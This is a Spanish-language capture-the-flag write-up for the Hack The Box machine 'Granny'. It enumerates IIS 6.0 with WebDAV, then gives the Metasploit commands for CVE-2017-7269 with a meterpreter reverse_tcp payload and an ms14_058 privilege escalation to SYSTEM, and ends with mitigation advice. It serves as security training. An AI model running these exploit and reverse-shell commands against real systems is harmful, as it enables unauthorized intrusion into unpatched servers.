---
titulo: "Granny"
fecha: 2026-10-18
plataforma: htb
so: windows
dificultad: Easy
estado: publicado
tecnicas: [iis, webdav, buffer-overflow, token-impersonation]
herramientas: [nmap, metasploit]
htb: "https://app.hackthebox.com/machines/Granny"
---

# Granny

[![Icono de la máquina Granny en Hack The Box](capturas/granny-icono.png){ .maquina-icono }](https://app.hackthebox.com/machines/Granny)

## Resumen

Servidor IIS 6.0 con WebDAV, de la misma familia que Grandpa. Se sube contenido mediante los métodos WebDAV y se explota el servicio para obtener una shell, que luego se eleva a `SYSTEM` mediante abuso de tokens.

## 1. Enumeración

Primero compruebo que la máquina está activa:

```bash
ping -c 5 10.129.XX.XX
```

Continúo con un escaneo de todos los puertos:

```bash
nmap -p- --open -T4 --min-rate 5000 10.129.XX.XX -oN ~/HTB_machines/Granny/ports
```

**Puertos abiertos:**

```
80/tcp open  http
```

Solo hay un puerto abierto. Lanzo scripts de reconocimiento sobre él:

```bash
nmap -p 80 -sVC -T4 --min-rate 5000 10.129.XX.XX -oN ~/HTB_machines/Granny/targeted
```

**Resultado relevante:**

```
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK, PUT
|   Server Type: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND SEARCH LOCK UNLOCK PUT
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
```

**IIS 6.0 con WebDAV habilitado.** Esta versión de IIS es de Windows Server 2003 y tiene una vulnerabilidad conocida de Buffer Overflow en el módulo WebDAV, específicamente en la función `ScStoragePathFromUrl` (**CVE-2017-7269**). La cantidad de métodos HTTP disponibles como `PUT`, `MOVE` o `DELETE` también amplía la superficie de ataque.

---

## 2. Explotación

Abro **msfconsole** y busco el módulo correspondiente:

```bash
msfconsole
search iis_webdav
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

Configuro el exploit:

```bash
set RHOSTS 10.129.XX.XX
set LHOST tun0
set payload windows/meterpreter/reverse_tcp
run
```

Obtengo una sesión Meterpreter como `NT AUTHORITY\NETWORK SERVICE`.

---

## 3. Escalada de Privilegios

El usuario `NETWORK SERVICE` tiene privilegios muy limitados y no puede acceder a las flags directamente. Necesito migrar a un proceso más estable y escalar a SYSTEM.

**Listo los procesos y migro a uno estable:**

```bash
meterpreter > ps
meterpreter > migrate <PID>
```

**Busco vectores de escalada locales:**

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
```

El módulo identifica varios exploits viables. Uso **ms14_058**:

```bash
meterpreter > background
use exploit/windows/local/ms14_058_track_popup_menu
set SESSION 1
set LHOST tun0
run
```

Obtengo una nueva sesión Meterpreter como `NT AUTHORITY\SYSTEM`.

---

## 4. Post-Explotación / Flags

Desde Meterpreter abro una shell de Windows:

```bash
meterpreter > shell
```

> En Windows Server 2003 el path es `Documents and Settings`, no `Users`.

**Flag de usuario (Lakis):**

```cmd
cd C:\Documents and Settings\Lakis\Desktop
type user.txt
```

```
700c5**************************
```

**Flag de administrador:**

```cmd
cd C:\Documents and Settings\Administrator\Desktop
type root.txt
```

```
aa4bf**************************
```

---

## Mitigación

Retirar IIS 6.0 y WebDAV por falta de soporte. Deshabilitar los métodos HTTP de escritura (PUT, MOVE) si no se usan. Mantener el sistema parcheado y limitar los privilegios de la cuenta de servicio.

## Qué he aprendido

Granny es una máquina muy similar a Grandpa pero con una diferencia clave: aquí no se obtiene SYSTEM directamente, hay una escalada de privilegios desde `NETWORK SERVICE` que añade un paso extra. El vector de entrada es **CVE-2017-7269**, el mismo Buffer Overflow en WebDAV de IIS 6.0 que afecta a Windows Server 2003 sin parchear.

**Lecciones:**
- IIS 6.0 con WebDAV expuesto en un servidor sin parchear = vulnerabilidad crítica
- `NETWORK SERVICE` no es `SYSTEM` — siempre verificar el contexto de la sesión inicial
- `local_exploit_suggester` es imprescindible para escalar privilegios en máquinas Windows antiguas
- Los sistemas sin actualizar siguen siendo vulnerables a exploits de hace más de una década

---

> ⚠️ *Este write up es con fines educativos. Las flags están censuradas.*
